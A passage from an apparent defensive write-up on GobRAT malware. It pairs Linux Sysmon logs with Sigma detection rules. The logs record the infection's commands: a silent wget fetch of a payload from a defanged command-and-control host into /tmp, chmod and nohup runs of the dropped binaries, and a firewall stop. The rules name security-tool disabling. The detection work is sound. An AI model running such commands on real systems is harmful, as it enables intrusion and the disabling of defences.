</EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nAnd for that reason, I\'ve created the next rule for crontab enumeration.\\r\\n\\r\\n```yml\\r\\ntitle: Crontab Enumeration\\r\\nid: 403ed92c-b7ec-4edd-9947-5b535ee12d46\\r\\nstatus: experimental\\r\\ndescription: Detects usage of crontab to list the tasks of the user\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\ntags:\\r\\n    - attack.discovery\\r\\n    - attack.t1007\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/crontab\'\\r\\n        CommandLine|contains: \'-l\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate use of crontab\\r\\nlevel: low\\r\\n```\\r\\n\\r\\n### Chmod Suspicious Directory\\r\\n\\r\\nThe payloads dropped on the system, which are located in the `/tmp/` directory, must have the appropriate permissions to be executed, for that reason `chmod` is used.\\r\\n\\r\\nThis command is executed 4 times for the payloads dropped.\\r\\n\\r\\n* /tmp/env/.qnapd/frpc\\r\\n* /tmp/env/.qnapd/apached\\r\\n* /tmp/env/.qnapd/sshd.sh\\r\\n* /tmp/env/.qnapd/waitd.sh\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16856</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-5109-ead5eb550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26597</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/chmod</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">chmod +x /tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nSince this behavior is suspicious, there was also a [sigma rule](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml) to detect this behavior and help us in this case.\\r\\n\\r\\n```yml\\r\\ntitle: Chmod Suspicious Directory\\r\\nid: 6419afd1-3742-47a5-a7e6-b50386cd15f8\\r\\nstatus: experimental\\r\\ndescription: Detects chmod targeting files in abnormal directory paths.\\r\\nreferences:\\r\\n    - https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/\\r\\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.002/T1222.002.md\\r\\nauthor: \'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io\'\\r\\ndate: 2022/06/03\\r\\ntags:\\r\\n    - attack.defense_evasion\\r\\n    - attack.t1222.002\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/chmod\'\\r\\n        CommandLine|contains:\\r\\n            - \'/tmp/\'\\r\\n            - \'/.Library/\'\\r\\n            - \'/etc/\'\\r\\n            - \'/opt/\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Admin changing file permissions.\\r\\nlevel: medium\\r\\n```\\r\\n\\r\\n\\r\\n### Disabling Security Tools\\r\\n\\r\\nSame behavior as we saw in the `Disable Or Stop Services` section. However, there is another sigma rule that is detecting it.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16755</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-9d3b-864902560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26548</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/systemctl</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">systemctl stop firewalld.service</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\n[Public sigma](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml) that can help to detect it.\\r\\n\\r\\n```yml\\r\\ntitle: Disabling Security Tools\\r\\nid: e3a8a052-111f-4606-9aee-f28ebeb76776\\r\\nstatus: test\\r\\ndescription: Detects disabling security tools\\r\\nreferences:\\r\\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md\\r\\nauthor: \xd6mer G\xfcnal, Alejandro Ortuno, oscd.community\\r\\ndate: 2020/06/17\\r\\nmodified: 2022/10/09\\r\\ntags:\\r\\n    - attack.defense_evasion\\r\\n    - attack.t1562.004\\r\\nlogsource:\\r\\n    category: process_creation\\r\\n    product: linux\\r\\ndetection:\\r\\n    selection_iptables_1:\\r\\n        Image|endswith: \'/service\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'iptables\'\\r\\n            - \'stop\'\\r\\n    selection_iptables_2:\\r\\n        Image|endswith: \'/service\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'ip6tables\'\\r\\n            - \'stop\'\\r\\n    selection_iptables_3:\\r\\n        Image|endswith: \'/chkconfig\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'iptables\'\\r\\n            - \'stop\'\\r\\n    selection_iptables_4:\\r\\n        Image|endswith: \'/chkconfig\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'ip6tables\'\\r\\n            - \'stop\'\\r\\n    selection_firewall_1:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'firewalld\'\\r\\n            - \'stop\'\\r\\n    selection_firewall_2:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'firewalld\'\\r\\n            - \'disable\'\\r\\n    selection_carbonblack_1:\\r\\n        Image|endswith: \'/service\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'cbdaemon\'\\r\\n            - \'stop\'\\r\\n    selection_carbonblack_2:\\r\\n        Image|endswith: \'/chkconfig\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'cbdaemon\'\\r\\n            - \'off\'\\r\\n    selection_carbonblack_3:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'cbdaemon\'\\r\\n            - \'stop\'\\r\\n    selection_carbonblack_4:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'cbdaemon\'\\r\\n            - \'disable\'\\r\\n    selection_selinux:\\r\\n        Image|endswith: \'/setenforce\'\\r\\n        CommandLine|contains: \'0\'\\r\\n    selection_crowdstrike_1:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'stop\'\\r\\n            - \'falcon-sensor\'\\r\\n    selection_crowdstrike_2:\\r\\n        Image|endswith: \'/systemctl\'\\r\\n        CommandLine|contains|all:\\r\\n            - \'disable\'\\r\\n            - \'falcon-sensor\'\\r\\n    condition: 1 of selection*\\r\\nfalsepositives:\\r\\n    - Legitimate administration activities\\r\\nlevel: medium\\r\\n```\\r\\n\\r\\n### Nohup Execution\\r\\n\\r\\n`nohup` can be used to execute binaries in the system. In fact, it was used to execute a fake `apached` service which is the GobRAT payload.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16945</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-5131-7d1f45560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26638</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/nohup</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">nohup /tmp/env/.qnapd/apached -d</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/tmp/env/.qnapd</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff13-6475-f587-0ded3d560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26633</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nThe following sigma rule was created to identify the execution of `nohup`.\\r\\n\\r\\n```yml\\r\\ntitle: Nohup Execution\\r\\nid: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2\\r\\nstatus: experimental\\r\\ndescription: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments\\r\\nreferences:\\r\\n    - https://gtfobins.github.io/gtfobins/nohup/\\r\\n    - https://en.wikipedia.org/wiki/Nohup\\r\\n    - https://www.computerhope.com/unix/unohup.htm\\r\\nauthor: \'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io\'\\r\\ndate: 2022/06/06\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/nohup\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Administrators or installed processes that leverage nohup\\r\\nlevel: medium\\r\\n```\\r\\n\\r\\n### Wget Creating Files in Tmp\\r\\n\\r\\nAnother behavior related to the creation of files is the use of `wget` to download a file into `/tmp/` folder.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>11</EventID>\\r\\n        <Version>2</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>11</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16795</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-9525-20d06e550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26571</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/wget</Data>\\r\\n        <Data Name=\\"TargetFilename\\">/tmp/env/.qnapd/apachedtmp</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nThe next sigma rule that I\'ve created detect files created by `wget` in `/tmp/` folders, something that is interesting to know.\\r\\n\\r\\n```yml\\r\\ntitle: Wget Creating Files in Tmp\\r\\nid: 35a05c60-9012-49b6-a11f-6bab741c9f74\\r\\nstatus: experimental\\r\\ndescription: Detects the use of wget to download content\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\ntags:\\r\\n    - attack.command_and_control\\r\\n    - attack.t1105\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: file_event\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/wget\'\\r\\n        TargetFilename|contains: \'/tmp/\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate downloads files in tmp folder.\\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### Execution From Tmp Folder\\r\\n\\r\\nProbably the most important execution for the threat actors during this infection. The GobRAT payload is loaded from the `/tmp/` folder, something that is suspicious and allow us to detect it with a new sigma rule.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16949</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26638</Data>\\r\\n        <Data Name=\\"Image\\">/tmp/env/.qnapd/apached</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">/tmp/env/.qnapd/apached -d</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/tmp/env/.qnapd</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ca62-6475-65ce-a2aae0550000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">1</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/lib/systemd/systemd</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/sbin/init splash</Data>\\r\\n        <Data Name=\\"ParentUser\\">root</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nThe sigma rule that I\'ve created is looking for processes loaded in the `/tmp/` folder.\\r\\n\\r\\n```yml\\r\\ntitle: Execution From Tmp Folder\\r\\nid: 312b42b1-bded-4441-8b58-163a3af58775\\r\\nstatus: experimental\\r\\ndescription: Detects suspicious executions from tmp folder\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\nlogsource:\\r\\n    product: linux\\r\\n    category: process_creation\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|startswith: \'/tmp/\'\\r\\n        ParentImage|startswith: \'/usr/\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Unknown\\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### Wget Download File To Tmp Folder in silent Mode\\r\\n\\r\\nIf we saw a file event to identify file creation of `wget` in `/tmp/`, now is time to detect the use of `wget` in silent mode.\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16794</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff05-6475-9525-20d06e550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26571</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/wget</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">wget -q -t 1 -T 8 --limit-rate 200k -O /tmp/env/.qnapd/apachedtmp hxxps://ktlvz.dnsfailover[.]net/zone.x86_64 --no-check-certificate</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{46700b68-ff05-6475-f547-38be1a560000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26546</Data>\\r\\n        <Data Name=\\"ParentImage\\">/usr/bin/dash</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">/bin/sh</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nThe sigma rule that can help us to detect it is the next one, which can look for the parameters `-q` for silent, `-O` to download and `/tmp/` in the command line, which means that the file could be downloaded in the `tmp` folder.\\r\\n\\r\\n```yml\\r\\ntitle: Wget Download File To Tmp Folder in Silence Mode\\r\\nid: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4\\r\\nstatus: experimental\\r\\ndescription: Detects the use of wget to download content\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\ntags:\\r\\n    - attack.command_and_control\\r\\n    - attack.t1105\\r\\nlogsource:\\r\\n    category: process_creation\\r\\n    product: linux\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/wget\'\\r\\n        CommandLine|contains|all: \\r\\n            - \'-q\' # Turn off Wget\u2019s output.\\r\\n            - \'-O\' # output\\r\\n            - \'/tmp/\'\\r\\n            #- \'--limit-rate\' # Limit the download speed\\r\\n            #- \'--no-check-certificate\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Legitimate downloads files in tmp folder.\\r\\nlevel: high\\r\\n\\r\\n```\\r\\n\\r\\n### Discovery Information About Files Created by GobRAT\\r\\n\\r\\nWe could consider this behavior to be specific to GobRAT, and it could be. But perhaps it could be related to other families in the future.\\r\\n\\r\\n```xml \\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16812</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-815f-0cee5e550000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26575</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/grep</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">grep sshd.sh</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/opt</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data Name=\\"TerminalSessionId\\">48</Data>\\r\\n        <Data Name=\\"IntegrityLevel\\">no level</Data>\\r\\n        <Data Name=\\"Hashes\\">-</Data>\\r\\n        <Data Name=\\"ParentProcessGuid\\">{00000000-0000-0000-0000-000000000000}</Data>\\r\\n        <Data Name=\\"ParentProcessId\\">26573</Data>\\r\\n        <Data Name=\\"ParentImage\\">-</Data>\\r\\n        <Data Name=\\"ParentCommandLine\\">-</Data>\\r\\n        <Data Name=\\"ParentUser\\">-</Data>\\r\\n    </EventData>\\r\\n</Event>\\r\\n```\\r\\n\\r\\nTo detect it, the next sigma rule can be used.\\r\\n\\r\\n```yml\\r\\ntitle: Discovery Information About Files Created by GobRAT\\r\\nid: e34cfa0c-0a50-4210-9cb3-5632d08eb041\\r\\nstatus: experimental\\r\\ndescription: Detects the use of grep to discover specific files created by GobRAT\\r\\nreferences:\\r\\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\\r\\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\\r\\n    - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection\\r\\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\\r\\ndate: 2023/30/05\\r\\ntags:\\r\\n    - attack.discovery\\r\\n    - attack.t1082\\r\\nlogsource:\\r\\n    category: process_creation\\r\\n    product: linux\\r\\ndetection:\\r\\n    selection:\\r\\n        Image|endswith: \'/grep\'\\r\\n        CommandLine|contains:\\r\\n            - \'apached\'\\r\\n            - \'sshd.sh\'\\r\\n            - \'zone.arm\'\\r\\n            - \'frpc\'\\r\\n    condition: selection\\r\\nfalsepositives:\\r\\n    - Unkwnon \\r\\nlevel: high\\r\\n```\\r\\n\\r\\n### Nohup Tmp File Execution\\r\\n\\r\\nAlthough there is a rule that simply detects the use of nohup, I thought it might be interesting to have another one with different severity to detect the use of the same process but on a `/tmp/` file. Therefore, I have created the following rule\\r\\n\\r\\n```xml\\r\\n<Event>\\r\\n    <System>\\r\\n        <Provider Name=\\"Linux-Sysmon\\" Guid=\\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\\"/>\\r\\n        <EventID>1</EventID>\\r\\n        <Version>5</Version>\\r\\n        <Level>4</Level>\\r\\n        <Task>1</Task>\\r\\n        <Opcode>0</Opcode>\\r\\n        <Keywords>0x8000000000000000</Keywords>\\r\\n        <EventRecordID>16945</EventRecordID>\\r\\n        <Correlation/>\\r\\n        <Execution ProcessID=\\"26414\\" ThreadID=\\"26414\\"/>\\r\\n        <Channel>Linux-Sysmon/Operational</Channel>\\r\\n        <Security UserId=\\"0\\"/>\\r\\n    </System>\\r\\n    <EventData>\\r\\n        <Data Name=\\"RuleName\\">-</Data>\\r\\n        <Data Name=\\"ProcessGuid\\">{46700b68-ff13-6475-5131-7d1f45560000}</Data>\\r\\n        <Data Name=\\"ProcessId\\">26638</Data>\\r\\n        <Data Name=\\"Image\\">/usr/bin/nohup</Data>\\r\\n        <Data Name=\\"FileVersion\\">-</Data>\\r\\n        <Data Name=\\"Description\\">-</Data>\\r\\n        <Data Name=\\"Product\\">-</Data>\\r\\n        <Data Name=\\"Company\\">-</Data>\\r\\n        <Data Name=\\"OriginalFileName\\">-</Data>\\r\\n        <Data Name=\\"CommandLine\\">nohup /tmp/env/.qnapd/apached -d</Data>\\r\\n        <Data Name=\\"CurrentDirectory\\">/tmp/env/.qnapd</Data>\\r\\n        <Data Name=\\"User\\">-</Data>\\r\\n        <Data Name=\\"LogonGuid\\">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\\r\\n        <Data Name=\\"LogonId\\">65535</Data>\\r\\n        <Data 